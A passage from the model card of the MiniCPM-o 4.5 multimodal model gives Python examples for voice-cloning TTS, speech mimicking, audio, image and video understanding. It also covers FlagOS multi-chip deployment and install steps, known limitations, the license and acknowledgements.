\"根据输入的音频提示生成相似的语音。\",\n    ref_audio,\n    \"你是一个具有以上声音风格的AI助手。请用高拟人度、口语化的方式和用户聊天。\" + \"你是一名心理咨询师兼播客主理人，热爱创作与深度对话。你性格细腻、富有共情力，善于从个人经历中提炼哲思。语言风格兼具理性与诗意，常以隐喻表达内在体验。\"\n  ]\n}\n\n</code></pre> \n</details> \n<h3>Speech and Audio Mode \n <!-- omit in toc --></h3> \n<h4>Zero-shot Text-to-speech (TTS) \n <!-- omit in toc --></h4> \n<p><code>MiniCPM-o-4.5</code> supports zero-shot text-to-speech (TTS). In this mode, the model functions as a highly-natural TTS system that can replicate a reference voice.</p> \n<details> \n Click to show TTS code. \n <pre><code class=\"language-python\">import librosa\n\nmodel = ...\nmodel.init_tts(streaming=False)\n\n# For both Chinese and English\nref_audio_path = \"assets/HT_ref_audio.wav\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\nsys_msg = {\"role\": \"system\", \"content\": [\n  \"模仿音频样本的音色并生成新的内容。\",\n  ref_audio,\n  \"请用这种声音风格来为用户提供帮助。 直接作答，不要有冗余内容\"\n]}\n\n# For English\nuser_msg = {\n  \"role\": \"user\",\n  \"content\": [\n    \"请朗读以下内容。\" + \" \" + \"I have a wrap up that I want to offer you now, a conclusion to our work together.\"\n  ]\n}\n\n# For Chinese\nuser_msg = {\n  \"role\": \"user\",\n  \"content\": [\n    \"请朗读以下内容。\" + \" \" + \"你好，欢迎来到艾米说科幻，我是艾米。\"\n  ]\n}\n\nmsgs = [sys_msg, user_msg]\nres = model.chat(\n    msgs=msgs,\n    do_sample=True,\n    max_new_tokens=512,\n    use_tts_template=True,\n    generate_audio=True,\n    temperature=0.1,\n    output_audio_path=\"result_voice_cloning.wav\",\n)\n</code></pre> \n</details> \n<h4>Mimick \n <!-- omit in toc --></h4> \n<p>The <code>Mimick</code> task evaluates a model's end-to-end speech modeling capability. The model takes audio input, transcribes it, and reconstructs the original audio with high fidelity, preserving detailed acoustic, paralinguistic, and semantic information. Higher similarity between the reconstructed and original audio indicates stronger end-to-end speech modeling capability.</p> \n<details> \n Click to show mimick code. \n <pre><code class=\"language-python\">import librosa\n\nmodel = ...\nmodel.init_tts(streaming=False)\n\nsystem_prompt = \"You are a helpful assistant. You can accept video, audio, and text input and output voice and text. Respond with just the answer, no redundancy.\"\n\nmimick_prompt = \"Please repeat the following speech in the appropriate language.\"\n\naudio_input, _ = librosa.load(\"assets/Trump_WEF_2018_10s.mp3\", sr=16000, mono=True)\n\nmsgs = [\n    {\"role\": \"system\", \"content\": [system_prompt]},\n    {\"role\": \"user\", \"content\": [mimick_prompt, audio_input]}\n  ]\n\nres = model.chat(\n    msgs=msgs,\n    do_sample=True,\n    max_new_tokens=512,\n    use_tts_template=True,\n    temperature=0.1,\n    generate_audio=True,\n    output_audio_path=\"output_mimick.wav\",\n)\n</code></pre> \n</details> \n<h4>Addressing Various Audio Understanding Tasks \n <!-- omit in toc --></h4> \n<p><code>MiniCPM-o-4.5</code> can also handle various audio understanding tasks, such as ASR, speaker analysis, general audio captioning, and sound scene tagging.</p> \n<p>For audio-to-text tasks, you can use the following prompts:</p> \n<ul> \n <li>ASR (Chinese, or AST EN→ZH): <code>请仔细听这段音频片段，并将其内容逐字记录。</code></li> \n <li>ASR (English, or AST ZH→EN): <code>Please listen to the audio snippet carefully and transcribe the content.</code></li> \n <li>Speaker Analysis: <code>Based on the speaker's content, speculate on their gender, condition, age range, and health status.</code></li> \n <li>General Audio Caption: <code>Summarize the main content of the audio.</code></li> \n <li>Sound Scene Tagging: <code>Utilize one keyword to convey the audio's content or the associated scene.</code></li> \n</ul> \n<details> \n Click to show audio understanding code. \n <pre><code class=\"language-python\">import librosa\n\nmodel = ...\nmodel.init_tts(streaming=False)\n\n# Load the audio to be transcribed/analyzed\naudio_input, _ = librosa.load(\"assets/Trump_WEF_2018_10s.mp3\", sr=16000, mono=True)\n\n# Choose a task prompt (see above for options)\ntask_prompt = \"Please listen to the audio snippet carefully and transcribe the content.\\n\"\nmsgs = [{\"role\": \"user\", \"content\": [task_prompt, audio_input]}]\n\nres = model.chat(\n    msgs=msgs,\n    do_sample=True,\n    max_new_tokens=512,\n    use_tts_template=True,\n    generate_audio=True,\n    temperature=0.3,\n    output_audio_path=\"result_audio_understanding.wav\",\n)\nprint(res)\n</code></pre> \n</details> \n<h3>Visual Understanding</h3> \n<p><code>MiniCPM-o-4.5</code> shares the same inference methods as <code>MiniCPM-V-4.5</code>.</p> \n<h4>Chat with Single Image \n <!-- omit in toc --></h4> \n<details> \n Click to show single image chat code. \n <pre><code class=\"language-python\">import torch\nfrom PIL import Image\nfrom transformers import AutoModel\n\nmodel = AutoModel.from_pretrained(\n    \"openbmb/MiniCPM-o-4_5\",\n    trust_remote_code=True,\n    attn_implementation=\"sdpa\",  # or \"flash_attention_2\"\n    torch_dtype=torch.bfloat16,\n    init_vision=True,\n    init_audio=False,\n    init_tts=False,\n)\nmodel.eval().cuda()\n\nimage = Image.open(\"assets/fossil.png\").convert(\"RGB\")\nquestion = \"What is in the image?\"\nmsgs = [{\"role\": \"user\", \"content\": [image, question]}]\n\nres = model.chat(msgs=msgs, use_tts_template=False)\nprint(res)\n</code></pre> \n</details> \n<h4>Chat with Multiple Images \n <!-- omit in toc --></h4> \n<details> \n Click to show Python code for multi-image input. \n <pre><code class=\"language-python\">import torch\nfrom PIL import Image\nfrom transformers import AutoModel\n\nmodel = ...\n\nimage1 = Image.open(\"assets/highway.png\").convert(\"RGB\")\nimage2 = Image.open(\"assets/fossil.png\").convert(\"RGB\")\nquestion = \"Compare image 1 and image 2, tell me about the differences between them.\"\nmsgs = [{\"role\": \"user\", \"content\": [image1, image2, question]}]\n\nanswer = model.chat(msgs=msgs, use_tts_template=False, enable_thinking=False)\nprint(answer)\n</code></pre> \n</details> \n<h4>In-Context Few-Shot Learning \n <!-- omit in toc --></h4> \n<details> \n Click to show Python code for few-shot learning. \n <pre><code class=\"language-python\">from PIL import Image\n\nmodel = ...\n\nquestion = \"production date\"\nimage1 = Image.open(\"example1.jpg\").convert(\"RGB\")\nanswer1 = \"2023.08.04\"\nimage2 = Image.open(\"example2.jpg\").convert(\"RGB\")\nanswer2 = \"2007.04.24\"\nimage_test = Image.open(\"test.jpg\").convert(\"RGB\")\n\nmsgs = [\n    {\"role\": \"user\", \"content\": [image1, question]},\n    {\"role\": \"assistant\", \"content\": [answer1]},\n    {\"role\": \"user\", \"content\": [image2, question]},\n    {\"role\": \"assistant\", \"content\": [answer2]},\n    {\"role\": \"user\", \"content\": [image_test, question]},\n]\n\nanswer = model.chat(msgs=msgs, use_tts_template=False, enable_thinking=False)\nprint(answer)\n</code></pre> \n</details> \n<h4>Chat with Video \n <!-- omit in toc --></h4> \n<details> \n Click to show Python code for video input. \n <pre><code class=\"language-python\">import torch\nfrom minicpmo.utils import get_video_frame_audio_segments\nfrom transformers import AutoModel\n\nmodel = ...\n\nvideo_path = \"assets/Skiing.mp4\"\nvideo_frames, _, _ = get_video_frame_audio_segments(video_path)\nprint(\"num frames:\", len(video_frames))\n\nquestion = \"Describe the video\"\nmsgs = [{\"role\": \"user\", \"content\": video_frames + [question]}]\n\nanswer = model.chat(\n    msgs=msgs,\n    max_new_tokens=128,\n    use_image_id=False,\n    max_slice_nums=1,\n    use_tts_template=False,\n    enable_thinking=False,  # Set True to enable thinking mode\n)\nprint(answer)\n</code></pre> \n</details> \n<h3>Structured Content Input</h3> \n<details> \n Click to show structured content input details. \n <p>The <code>chat</code> method accepts message content in two formats:</p> \n <p><strong>Native format</strong> – pass Python objects directly:</p> \n <pre><code class=\"language-python\">msgs = [{\"role\": \"user\", \"content\": [pil_image, audio_ndarray, \"Describe this.\"]}]\n</code></pre> \n <p><strong>OpenAI-compatible format</strong> – use structured dictionaries:</p> \n <pre><code class=\"language-python\">msgs = [\n    {\n        \"role\": \"user\",\n        \"content\": [\n            {\"type\": \"image_url\", \"image_url\": {\"url\": \"/path/to/image.jpg\"}},\n            {\"type\": \"audio_url\", \"audio_url\": {\"url\": \"/path/to/audio.wav\"}},\n            {\"type\": \"video_url\", \"video_url\": {\"url\": \"/path/to/video.mp4\", \"use_audio\": True}},\n            {\"type\": \"text\", \"text\": \"Describe this.\"}\n        ]\n    }\n]\n</code></pre> \n <p><strong>Supported types:</strong></p> \n <table> \n  <thead> \n   <tr> \n    <th>Type</th> \n    <th>Input</th> \n    <th>Converts to</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td><code>text</code></td> \n    <td><code>{\"type\": \"text\", \"text\": \"...\"}</code></td> \n    <td><code>str</code></td> \n   </tr> \n   <tr> \n    <td><code>image_url</code></td> \n    <td><code>{\"type\": \"image_url\", \"image_url\": {\"url\": \"...\"}}</code></td> \n    <td><code>PIL.Image</code></td> \n   </tr> \n   <tr> \n    <td><code>audio_url</code></td> \n    <td><code>{\"type\": \"audio_url\", \"audio_url\": {\"url\": \"...\"}}</code></td> \n    <td><code>np.ndarray</code> (16kHz mono)</td> \n   </tr> \n   <tr> \n    <td><code>video_url</code></td> \n    <td><code>{\"type\": \"video_url\", \"video_url\": {\"url\": \"...\", \"stack_frames\": 1, \"use_audio\": True}}</code></td> \n    <td><code>List[Image, ndarray, ...]</code></td> \n   </tr> \n  </tbody> \n </table> \n <ul> \n  <li><strong>URL sources</strong>: local file paths or <code>http://</code>/<code>https://</code> URLs</li> \n  <li><strong>Mixed formats</strong>: native objects and structured dicts can be combined in the same content list</li> \n </ul> \n</details> \n<h2>Supported Frameworks</h2> \n<h3>FlagOS</h3> \n<p>To enable large-scale deployment across different AI chips, Beijing Zhiyuan Research Institute, together with numerous research institutions, chip manufacturers, system vendors, and algorithm and software organizations both domestically and internationally, jointly initiated and established the FlagOS Open Source Community.</p> \n<p>The FlagOS community is dedicated to building a unified, open-source system software stack for various AI chips, encompassing core open-source projects such as a large-scale operator library, a unified AI compiler, parallel training and inference frameworks, and a unified communication library. It aims to create an open technology ecosystem connecting the “model-system-chip” layers. By enabling “develop once, deploy across chips”, FlagOS unlocks the computational potential of hardware, breaks down the ecosystem silos between different chip software stacks, and effectively reduces migration costs for developers. The FlagOS community fosters an AI hardware and software ecosystem, overcomes single-vendor closed-source monopolies, promotes widespread deployment of AI hardware technologies, and is committed to rooted in China while embracing global collaboration. Official website: <a href=\"https://flagos.io\">https://flagos.io</a>.</p> \n<details> \n Click to show FlagOS details. \n <h4>FlagOS: Supporting Multiple AI Chips \n  <!-- omit in toc --></h4> \n <p>Thanks to FlagOS’s unified multi-chip AI system software stack, MiniCPM-o 4.5 was adapted to 6 different AI chips in an extremely short time. Currently, the multi-chip version of MiniCPM-o 4.5 has been released on FlagRelease, FlagOS’s platform for automatic migration, adaptation, and deployment of large models across multi-architecture AI chips. Details are as follows:</p> \n <table> \n  <thead> \n   <tr> \n    <th align=\"left\">Vendor</th> \n    <th align=\"center\">ModelScope</th> \n    <th align=\"center\">Huggingface</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td align=\"left\">Nvidia</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-nvidia-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-nvidia-FlagOS</a></td> \n   </tr> \n   <tr> \n    <td align=\"left\">Hygon-BW1000</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-hygon-FlagOS\">MiniCPM-o-4.5-hygon-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-hygon-FlagOS\">MiniCPM-o-4.5-hygon-FlagOS</a></td> \n   </tr> \n   <tr> \n    <td align=\"left\">Metax-C550</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-metax-FlagOS\">MiniCPM-o-4.5-metax-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-metax-FlagOS\">MiniCPM-o-4.5-metax-FlagOS</a></td> \n   </tr> \n   <tr> \n    <td align=\"left\">Iluvatar-BIV150</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-iluvatar-FlagOS\">MiniCPM-o-4.5-iluvatar-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-iluvatar-FlagOS\">MiniCPM-o-4.5-iluvatar-FlagOS</a></td> \n   </tr> \n   <tr> \n    <td align=\"left\">Ascend-A3</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-ascend-FlagOS\">MiniCPM-o-4.5-ascend-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-ascend-FlagOS\">MiniCPM-o-4.5-ascend-FlagOS</a></td> \n   </tr> \n   <tr> \n    <td align=\"left\">Zhenwu-810E</td> \n    <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-zhenwu-FlagOS\">MiniCPM-o-4.5-zhenwu-FlagOS</a></td> \n    <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-zhenwu-FlagOS\">MiniCPM-o-4.5-zhenwu-FlagOS</a></td> \n   </tr> \n  </tbody> \n </table> \n <h5>Comprehensive Evaluation \n  <!-- omit in toc --></h5> \n <h6>Transformers-FlagOS version \n  <!-- omit in toc --></h6> \n <p>Accuracy Difference between <code>USE_FLAGOS=1</code> on multi-backend and <code>USE_FLAGOS=0</code> on Nvidia-CUDA</p> \n <table> \n  <thead> \n   <tr> \n    <th align=\"left\">Metrics</th> \n    <th align=\"center\">FlagOS Backend</th> \n    <th align=\"center\">Difference with Nvidia-CUDA</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td align=\"left\">Video-MME 0-shot avg@1 ↑</td> \n    <td align=\"center\">Nvidia</td> \n    <td align=\"center\">0.33%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Video-MME 0-shot avg@1 ↑</td> \n    <td align=\"center\">Hygon-BW1000</td> \n    <td align=\"center\">0.17%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Video-MME 0-shot avg@1 ↑</td> \n    <td align=\"center\">Ascend-A3</td> \n    <td align=\"center\">0.50%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Video-MME 0-shot avg@1 ↑</td> \n    <td align=\"center\">Iluvatar-BIV150</td> \n    <td align=\"center\">1.83%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Video-MME 0-shot avg@1 ↑</td> \n    <td align=\"center\">Metax-C550</td> \n    <td align=\"center\">0.75%</td> \n   </tr> \n  </tbody> \n </table> \n <h6>VLLM-FlagOS version \n  <!-- omit in toc --></h6> \n <p>Accuracy Difference between <code>USE_FLAGGEMS=1 FLAGCX_PATH=/workspace/FlagCX</code> on Nvidia or <code>USE_FLAGGEMS=1</code> on ZHENW 810E, and launching vllm server directly on Nvidia</p> \n <table> \n  <thead> \n   <tr> \n    <th align=\"left\">Metrics (avg@1)</th> \n    <th align=\"center\">Difference between Nvidia-FlagOS and Nvidia-CUDA</th> \n    <th align=\"center\">Difference between Zhenwu-FlagOS and Nvidia-CUDA</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td align=\"left\">CMMMU ↑</td> \n    <td align=\"center\">0.72%</td> \n    <td align=\"center\">3.5%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">MMMU ↑</td> \n    <td align=\"center\">1.44%</td> \n    <td align=\"center\">1.18%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">MMMU_Pro_standard ↑</td> \n    <td align=\"center\">0.83%</td> \n    <td align=\"center\">0.22%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">MM-Vet v2 ↑</td> \n    <td align=\"center\">0.46%</td> \n    <td align=\"center\">1.33%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">OCRBench ↑</td> \n    <td align=\"center\">0.10%</td> \n    <td align=\"center\">1%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">CII-Bench ↑</td> \n    <td align=\"center\">0.40%</td> \n    <td align=\"center\">0.13%</td> \n   </tr> \n   <tr> \n    <td align=\"left\">Blink ↑</td> \n    <td align=\"center\">1.90%</td> \n    <td align=\"center\">2.19%</td> \n   </tr> \n  </tbody> \n </table> \n <h4>FlagOS Usage \n  <!-- omit in toc --></h4> \n <h5>FlagOS Performance Acceleration on Nvidia \n  <!-- omit in toc --></h5> \n <p>On the Transformers version, under the premise of precision alignment between the CUDA and FlagOS ecosystems, FlagOS achieves a 6% performance improvement in total task execution time compared to CUDA.</p> \n <h6>From FlagRelease【Recommendation】 \n  <!-- omit in toc --></h6> \n <p>FlagRelease is a platform developed by the FlagOS team for automatic migration, adaptation, and deployment of large models across multi-architecture AI chips. The multi-chip version of MiniCPM-o 4.5 has already been released on FlagRelease. All necessary software packages are pre-installed on the platform, so users do not need to install anything.</p> \n <ul> \n  <li> <p>FlagRelease Image Key Versions</p> \n   <table> \n    <thead> \n     <tr> \n      <th align=\"left\">Component</th> \n      <th align=\"left\">Version</th> \n     </tr> \n    </thead> \n    <tbody> \n     <tr> \n      <td align=\"left\">Accelerator Card Driver</td> \n      <td align=\"left\">570.158.01</td> \n     </tr> \n     <tr> \n      <td align=\"left\">CUDA SDK Build</td> \n      <td align=\"left\">cuda_13.0.r13.0/compiler.36424714_0</td> \n     </tr> \n     <tr> \n      <td align=\"left\">FlagTree</td> \n      <td align=\"left\">0.4.0+3.5</td> \n     </tr> \n     <tr> \n      <td align=\"left\">FlagGems</td> \n      <td align=\"left\">4.2.1rc0</td> \n     </tr> \n     <tr> \n      <td align=\"left\">vllm &amp; vllm-plugin-fl</td> \n      <td align=\"left\">0.13.0 + vllm_fl 0.0.0</td> \n     </tr> \n     <tr> \n      <td align=\"left\">FlagCX</td> \n      <td align=\"left\">0.1.0</td> \n     </tr> \n    </tbody> \n   </table> </li> \n  <li> <p>FlagRelease Quick Start</p> \n   <table> \n    <thead> \n     <tr> \n      <th align=\"left\">Vendor</th> \n      <th align=\"center\">ModelScope</th> \n      <th align=\"center\">Huggingface</th> \n     </tr> \n    </thead> \n    <tbody> \n     <tr> \n      <td align=\"left\">Nvidia</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-nvidia-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-nvidia-FlagOS</a></td> \n     </tr> \n     <tr> \n      <td align=\"left\">Hygon-BW1000</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-hygon-FlagOS\">MiniCPM-o-4.5-hygon-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-hygon-FlagOS\">MiniCPM-o-4.5-hygon-FlagOS</a></td> \n     </tr> \n     <tr> \n      <td align=\"left\">Metax-C550</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-metax-FlagOS\">MiniCPM-o-4.5-metax-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-metax-FlagOS\">MiniCPM-o-4.5-metax-FlagOS</a></td> \n     </tr> \n     <tr> \n      <td align=\"left\">Iluvatar-BIV150</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-iluvatar-FlagOS\">MiniCPM-o-4.5-iluvatar-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-iluvatar-FlagOS\">MiniCPM-o-4.5-iluvatar-FlagOS</a></td> \n     </tr> \n     <tr> \n      <td align=\"left\">Ascend-A3</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-ascend-FlagOS\">MiniCPM-o-4.5-ascend-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-ascend-FlagOS\">MiniCPM-o-4.5-ascend-FlagOS</a></td> \n     </tr> \n     <tr> \n      <td align=\"left\">Zhenwu-810E</td> \n      <td align=\"center\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-zhenwu-FlagOS\">MiniCPM-o-4.5-zhenwu-FlagOS</a></td> \n      <td align=\"center\"><a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-zhenwu-FlagOS\">MiniCPM-o-4.5-zhenwu-FlagOS</a></td> \n     </tr> \n    </tbody> \n   </table> </li> \n </ul> \n <h5>From Scratch \n  <!-- omit in toc --></h5> \n <ul> \n  <li>Dependencies: Python 3.12, GLIBC 2.39, GLIBCXX 3.4.33, CXXABI 1.3.15</li> \n </ul> \n <h6>Transformers \n  <!-- omit in toc --></h6> \n <ul> \n  <li> <p>Installing the FlagOS Operator Library</p> <p>Official Repository: <a href=\"https://github.com/flagos-ai/FlagGems\">https://github.com/flagos-ai/FlagGems</a></p> <pre><code class=\"language-shell\">pip install flag-gems==4.2.1rc0\n</code></pre> </li> \n  <li> <p>Installing the FlagOS Compiler</p> <p>Official Repository: <a href=\"https://github.com/flagos-ai/flagtree\">https://github.com/flagos-ai/flagtree</a></p> <p>Quick Reference for Core Dependency Versions: <a href=\"https://github.com/flagos-ai/FlagTree/raw/main/documents/build.md#tips-for-building\">https://github.com/flagos-ai/FlagTree/blob/main/documents/build.md#tips-for-building</a></p> <pre><code class=\"language-shell\">pip uninstall triton\n\npython3 -m pip install flagtree==0.4.0+3.5 --index-url=https://resource.flagos.net/repository/flagos-pypi-hosted/simple --trusted-host=https://resource.flagos.net\n</code></pre> </li> \n  <li> <p>Activating Acceleration</p> <p>Add <code>USE_FLAGOS=1</code> before the command for the task you want to run. For example, when you run:</p> <pre><code class=\"language-shell\">python3 generate_speech_from_video.py\n</code></pre> <p>To use the MiniCPM-o-4.5 model to generate spoken responses from video content, you can:</p> <pre><code class=\"language-shell\">USE_FLAGOS=1 python3 generate_speech_from_video.py\n</code></pre> <p>to accelerate this process with FlagOS.</p> </li> \n </ul> \n <h6>Vllm Version \n  <!-- omit in toc --></h6> \n <ul> \n  <li> <p>Installing the FlagOS Operator Library</p> <p>Official Repository: <a href=\"https://github.com/flagos-ai/FlagGems\">https://github.com/flagos-ai/FlagGems</a></p> <pre><code class=\"language-shell\">pip install flag-gems==4.2.1rc0\npip install triton==3.5.1\n</code></pre> </li> \n  <li> <p>Activating Acceleration</p> <p>Add <code>USE_FLAGOS=1</code> before the command for the task you want to run. For example, when you run:</p> <pre><code class=\"language-shell\">vllm serve ${model_path} --dtype auto  --gpu_memory_utilization 0.9 --trust-remote-code --max-num-batched-tokens 2048 --served-model-name cpmo --port ${Port}\n</code></pre> <p>To start the MiniCPM-o-4.5 server, you can:</p> <pre><code class=\"language-shell\">USE_FLAGOS=1 vllm serve ${model_path} --dtype auto  --gpu_memory_utilization 0.9 --trust-remote-code --max-num-batched-tokens 2048 --served-model-name cpmo --port ${Port}\n</code></pre> <p>to accelerate this process with FlagOS.</p> </li> \n </ul> \n <h4>Using FlagOS Unified Multi-Chip Backend Plugin \n  <!-- omit in toc --></h4> \n <p><a href=\"https://github.com/flagos-ai/vllm-plugin-FL\">vllm-plugin-FL</a> is a plugin built for the vLLM inference/service framework. Developed on top of FlagOS’s unified multi-chip backend, it is designed to extend vLLM’s capabilities and performance across a variety of hardware environments.</p> \n <h5>Using vllm-plugin-FL \n  <!-- omit in toc --></h5> \n <table> \n  <thead> \n   <tr> \n    <th align=\"left\">Vendor</th> \n    <th align=\"left\">From Scratch</th> \n    <th align=\"left\">From FlagRelease</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td align=\"left\">Nvidia</td> \n    <td align=\"left\"><a href=\"https://github.com/flagos-ai/vllm-plugin-FL/raw/main/examples/minicpm/README.md\">vllm-plugin-FL/MiniCPM-o-4.5</a></td> \n    <td align=\"left\"><a href=\"https://modelscope.cn/models/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-ModelScope</a>, <a href=\"https://huggingface.co/FlagRelease/MiniCPM-o-4.5-nvidia-FlagOS\">MiniCPM-o-4.5-HuggingFace</a></td> \n   </tr> \n  </tbody> \n </table> \n</details> \n<h3>vLLM, SGLang, llama.cpp, Ollama</h3> \n<p>We support inference with vLLM, SGLang, llama.cpp and Ollama. Refer to our <a href=\"https://github.com/OpenSQZ/MiniCPM-V-Cookbook\">Cookbook</a> for more details.</p> \n<h3>LLaMA-Factory, SWIFT</h3> \n<p>We support fine-tuning with LLaMA-Factory, SWIFT. Refer to our <a href=\"https://github.com/OpenSQZ/MiniCPM-V-Cookbook\">Cookbook</a> for more details.</p> \n<h2>Awesome work using MiniCPM-V &amp; MiniCPM-o</h2> \n<ul> \n <li><a href=\"https://github.com/CatchTheTornado/text-extract-api\">text-extract-api</a>: Document extraction API using OCRs and Ollama supported models <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/CatchTheTornado/text-extract-api\" /></li> \n <li><a href=\"https://github.com/heshengtao/comfyui_LLM_party\">comfyui_LLM_party</a>: Build LLM workflows and integrate into existing image workflows <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/heshengtao/comfyui_LLM_party\" /></li> \n <li><a href=\"https://github.com/imanoop7/Ollama-OCR\">Ollama-OCR</a>: OCR package uses vlms through Ollama to extract text from images and PDF <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/imanoop7/Ollama-OCR\" /></li> \n <li><a href=\"https://github.com/MixLabPro/comfyui-mixlab-nodes\">comfyui-mixlab-nodes</a>: ComfyUI node suite supports Workflow-to-APP、GPT&amp;3D and more <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/MixLabPro/comfyui-mixlab-nodes\" /></li> \n <li><a href=\"https://github.com/HumanAIGC-Engineering/OpenAvatarChat\">OpenAvatarChat</a>: Interactive digital human conversation implementation on single PC <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/HumanAIGC-Engineering/OpenAvatarChat\" /></li> \n <li><a href=\"https://github.com/arkohut/pensieve\">pensieve</a>: A privacy-focused passive recording project by recording screen content <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/arkohut/pensieve\" /></li> \n <li><a href=\"https://github.com/icereed/paperless-gpt\">paperless-gpt</a>: Use LLMs to handle paperless-ngx, AI-powered titles, tags and OCR <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/icereed/paperless-gpt\" /></li> \n <li><a href=\"https://github.com/kimjammer/Neuro\">Neuro</a>: A recreation of Neuro-Sama, but running on local models on consumer hardware <img alt=\"GitHub Repo stars\" src=\"https://img.shields.io/github/stars/kimjammer/Neuro\" /></li> \n</ul> \n<h2>Limitations</h2> \n<p>As an experimental trial, we find MiniCPM-o 4.5 has notable limitations worth further investigation and improvement.</p> \n<ul> \n <li><strong>Foundation Capability.</strong> The full-duplex omni-modality live streaminig capability still needs improvement in its foundation capability.</li> \n <li><strong>Unstable Speech Output in Omni Mode.</strong> Speech synthesis can mispronounce characters in full-duplex omni-modal live streaminig mode.</li> \n <li><strong>Mixed Language.</strong> The model can sometimes respond with mixed English and Chinese in speech and omni mode.</li> \n <li><strong>High-latency on Web Demo.</strong> Users may experience unusual high-latency or even miss part of model output fragments when using our web demo hosted on overseas servers. We recommend deploying the demo locally or with good network connections.</li> \n</ul> \n<h2>Model License \n <!-- omit in toc --></h2> \n<ul> \n <li> <p>The MiniCPM-o/V model weights and code are open-sourced under the <a href=\"https://github.com/OpenBMB/MiniCPM-V/raw/main/LICENSE\">Apache-2.0</a> license.</p> </li> \n <li> <p>To help us better understand and support our users, we would deeply appreciate it if you could consider optionally filling out a brief registration <a href=\"https://modelbest.feishu.cn/share/base/form/shrcnpV5ZT9EJ6xYjh3Kx0J6v8g\">\"questionnaire\"</a>.</p> </li> \n</ul> \n<h2>Statement \n <!-- omit in toc --></h2> \n<p>As MLLMs, MiniCPM-o/V models generate content by learning a large number of multimodal corpora, but they cannot comprehend, express personal opinions, or make value judgements. Anything generated by MiniCPM-o/V models does not represent the views and positions of the model developers</p> \n<p>We will not be liable for any problems arising from the use of MiniCPM-o/V models, including but not limited to data security issues, risk of public opinion, or any risks and problems arising from the misdirection, misuse, dissemination, or misuse of the model.</p> \n<h2>Acknowledgements</h2> \n<p>We would like to thank the following projects:</p> \n<ul> \n <li><a href=\"https://huggingface.co/Qwen/Qwen3-8B\">Qwen3</a> for providing language backbone</li> \n <li><a href=\"https://github.com/google-research/big_vision/raw/main/big_vision/configs/proj/image_text/README_siglip2.md\">SigLIP2</a> for providing vision understanding module</li> \n <li><a href=\"https://github.com/openai/whisper\">Whisper</a> for providing audio and speech understanding module</li> \n <li><a href=\"https://github.com/FunAudioLLM/CosyVoice\">CosyVoice2</a> and <a href=\"https://github.com/stepfun-ai/Step-Audio2\">Step-Audio2</a> for providing speech tokenizer and high-efficiency Token2Wav module.</li> \n <li><a href=\"https://github.com/huggingface/transformers\">Transformers</a></li> \n</ul> \n<h2>Institutions \n <!-- omit in toc --></h2> \n<p>This project is developed by the following institutions:</p> \n<ul> \n <li><img 